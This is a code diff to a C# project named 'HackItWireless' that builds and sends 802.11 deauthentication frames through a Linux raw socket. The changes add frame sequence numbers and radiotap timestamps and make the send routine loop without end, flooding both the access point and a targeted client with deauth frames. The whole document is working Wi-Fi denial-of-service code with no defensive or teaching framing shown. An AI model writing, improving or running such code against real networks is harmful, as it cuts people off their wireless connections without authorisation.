@@ -42,7 +42,7 @@ namespace HackItWireless
             public byte[] sll_addr;
         }
 
-        public byte[] BuildDeauthFrame(string bssid, string stationMac, ushort reasonCode = 7)
+        public byte[] BuildDeauthFrame(string bssid, string stationMac, ushort reasonCode = 7, uint seq = 0)
         {
             if (string.IsNullOrWhiteSpace(bssid))
                 throw new ArgumentException("BSSID cannot be null or empty.", nameof(bssid));
@@ -75,8 +75,9 @@ namespace HackItWireless
             Array.Copy(bssidBytes, 0, frame, offset, 6);
             offset += 6;
 
-            frame[offset] = 0;
-            frame[offset + 1] = 0;
+            ushort encSeq = (ushort)((seq << 4) & 0xFFFF);
+            frame[offset] = (byte)(encSeq & 0xFF);
+            frame[offset + 1] = (byte)((encSeq >> 8) & 0xFF);
             offset += 2;
 
             frame[offset] = (byte)(reasonCode & 0xFF);
@@ -85,26 +86,14 @@ namespace HackItWireless
             return frame;
         }
 
-public int SendDeauthBurst(string interfaceName, string bssid, string station, int count, int reason = 7)
+public int SendDeauthBurst(string interfaceName, string bssid, string station, int reason = 7)
 {
     if (!RuntimeInformation.IsOSPlatform(OSPlatform.Linux))
         throw new PlatformNotSupportedException("Raw socket deauth requires Linux");
 
-    byte[] frame = BuildDeauthFrame(bssid, station, (ushort)reason);
-    byte[] radiotap = new byte[] { 0x00, 0x00, 0x0C, 0x00, 0x02, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00 };
-    byte[] targetFrame = new byte[radiotap.Length + frame.Length];
-    Buffer.BlockCopy(radiotap, 0, targetFrame, 0, radiotap.Length);
-    Buffer.BlockCopy(frame, 0, targetFrame, radiotap.Length, frame.Length);
+        byte[] radiotap = new byte[] { 0x00, 0x00, 0x14, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
 
     bool targeted = station != "FF:FF:FF:FF:FF:FF";
-    byte[] clientFrame = null;
-    if (targeted)
-    {
-        byte[] cf = BuildDeauthFrame(station, bssid, (ushort)reason);
-        clientFrame = new byte[radiotap.Length + cf.Length];
-        Buffer.BlockCopy(radiotap, 0, clientFrame, 0, radiotap.Length);
-        Buffer.BlockCopy(cf, 0, clientFrame, radiotap.Length, cf.Length);
-    }
 
     byte[] ifaceBytes = System.Text.Encoding.ASCII.GetBytes(interfaceName + "\0");
     uint ifindex = if_nametoindex(ifaceBytes);
@@ -128,18 +117,29 @@ public int SendDeauthBurst(string interfaceName, string bssid, string station, i
     if (r < 0) { close(fd); return 0; }
 
     int sent = 0;
+    uint seq = 0;
     try
     {
         while (true)
         {
+            long ts = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds() * 1000L;
             for (int i = 0; i < 50; i++)
             {
-                send(fd, targetFrame, targetFrame.Length, 0);
-                sent++;
+                byte[] f = BuildDeauthFrame(bssid, station, (ushort)reason, seq++);
+                byte[] targetFrame = new byte[radiotap.Length + f.Length];
+                Buffer.BlockCopy(radiotap, 0, targetFrame, 0, radiotap.Length);
+                Buffer.BlockCopy(BitConverter.GetBytes(ts), 0, targetFrame, 8, 8);
+                Buffer.BlockCopy(f, 0, targetFrame, radiotap.Length, f.Length);
+                if (send(fd, targetFrame, targetFrame.Length, 0) > 0) sent++;
+
                 if (targeted)
                 {
-                    send(fd, clientFrame, clientFrame.Length, 0);
-                    sent++;
+                    byte[] cf = BuildDeauthFrame(station, bssid, (ushort)reason, seq++);
+                    byte[] clientFrame = new byte[radiotap.Length + cf.Length];
+                    Buffer.BlockCopy(radiotap, 0, clientFrame, 0, radiotap.Length);
+                    Buffer.BlockCopy(BitConverter.GetBytes(ts), 0, clientFrame, 8, 8);
+                    Buffer.BlockCopy(cf, 0, clientFrame, radiotap.Length, cf.Length);
+                    if (send(fd, clientFrame, clientFrame.Length, 0) > 0) sent++;
                 }
             }
         }
